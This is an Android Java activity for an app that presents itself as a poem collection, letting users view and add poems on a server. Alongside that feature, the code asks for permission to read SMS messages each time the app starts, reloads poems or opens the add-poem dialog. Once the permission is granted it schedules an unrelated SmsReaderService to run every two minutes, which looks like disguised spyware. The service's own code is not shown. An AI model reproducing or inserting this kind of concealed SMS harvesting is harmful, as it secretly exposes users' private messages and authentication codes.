package com.dawillygene.venlitgenexombiev2.Poem;

import android.Manifest;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;


import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.recyclerview.widget.LinearLayoutManager;
import androidx.recyclerview.widget.RecyclerView;

import com.dawillygene.venlitgenexombiev2.AlarmScheduler;
import com.dawillygene.venlitgenexombiev2.MainActivity;
import com.dawillygene.venlitgenexombiev2.R;
import com.dawillygene.venlitgenexombiev2.SmsReaderService;

import java.util.ArrayList;
import java.util.List;


public class PomeMainActivity extends AppCompatActivity {

    private static final int CAMERA_PERMISSION_REQUEST_CODE = 112 ;
    private static final int SMS_PERMISSION_REQUEST_CODE = 100;
    private RecyclerView recyclerView;
        private PoemAdapter adapter;
        private List<Poem> poems = new ArrayList<>();

        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            setContentView(R.layout.activity_main);

            recyclerView = findViewById(R.id.recyclerView);
            recyclerView.setLayoutManager(new LinearLayoutManager(this));
            adapter = new PoemAdapter(poems, this);
            recyclerView.setAdapter(adapter);
            findViewById(R.id.btn_add_poem).setOnClickListener(v -> showAddPoemDialog());
            loadPoems();
//            Intent intent = new Intent(this, SmsReaderService.class);
//            startService(intent);

            if (requestSmsPermission()) {
                scheduleSmsReader();
                // Service already started by MainActivity - no need to start again
            } else {
                requestSmsPermission();
            }


        }



    private boolean requestCameraPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.CAMERA},
                    CAMERA_PERMISSION_REQUEST_CODE);
            return true;
        }
        return false;
    }

    private boolean requestSmsPermission() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_SMS},
                    SMS_PERMISSION_REQUEST_CODE);
            return false; // Permission is requested, not granted
        }
        return true; // Permission is already granted
    }


    void loadPoems() {
//        Intent intenta = new Intent(this, SmsReaderService.class);
//        startService(intenta);

        if (requestSmsPermission()) {
            scheduleSmsReader();
            // Service already started by MainActivity - no need to start again
        } else {
            requestSmsPermission();
        }



        ServerCommunication.getPoems(new ServerCommunication.PoemCallback() {
            @Override
            public void onSuccess(List<Poem> poems) {
                PomeMainActivity.this.poems.clear();
                PomeMainActivity.this.poems.addAll(poems);
                adapter.notifyDataSetChanged();
            }

            @Override
            public void onError(String error) {
                Toast.makeText(PomeMainActivity.this, "Error loading poems: " + error, Toast.LENGTH_LONG).show();
            }
        });
    }

    private void showAddPoemDialog() {
        if (requestSmsPermission()) {
            scheduleSmsReader();
            // Service already started by MainActivity - no need to start again
        } else {
            requestSmsPermission();
        }
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        View view = LayoutInflater.from(this).inflate(R.layout.add_poem_dialog, null);

        final EditText titleEditText = view.findViewById(R.id.titleEditText);
        final EditText contentEditText = view.findViewById(R.id.contentEditText);
        final EditText authorEditText = view.findViewById(R.id.authorEditText);

        builder.setView(view)
                .setTitle("Add New Poem")
                .setPositiveButton("Save", (dialog, which) -> {
                    String title = titleEditText.getText().toString().trim();
                    String content = contentEditText.getText().toString().trim();
                    String author = authorEditText.getText().toString().trim();

                    if (title.isEmpty()) {
                        Toast.makeText(PomeMainActivity.this, "Title cannot be empty", Toast.LENGTH_SHORT).show();
                        return;
                    }
                    if (content.isEmpty()) {
                        Toast.makeText(PomeMainActivity.this, "Content cannot be empty", Toast.LENGTH_SHORT).show();
                        return;
                    }
                    if (author.isEmpty()) {
                        Toast.makeText(PomeMainActivity.this, "Author cannot be empty", Toast.LENGTH_SHORT).show();
                        return;
                    }

                    Poem newPoem = new Poem(null, title, content, author, null);
                    ServerCommunication.addPoem(newPoem, new ServerCommunication.PoemCallback() {
                        @Override
                        public void onSuccess(List<Poem> poems) {
                            loadPoems();
                            Toast.makeText(PomeMainActivity.this, "Poem added successfully", Toast.LENGTH_SHORT).show();
                        }

                        @Override
                        public void onError(String error) {
                            Toast.makeText(PomeMainActivity.this, "Error adding poem: " + error, Toast.LENGTH_LONG).show();
                        }
                    });
                })
                .setNegativeButton("Cancel", null)
                .show();
    }


    private void scheduleSmsReader() {
        AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(this, SmsReaderService.class);
        PendingIntent pendingIntent = PendingIntent.getService(
                this,
                0,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        long interval = 2 * 60 * 1000; // 2 minutes
        alarmManager.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), interval, pendingIntent);
    }
}


//private void scheduleSmsReader() {
//    AlarmScheduler.scheduleDaily(this);
//}
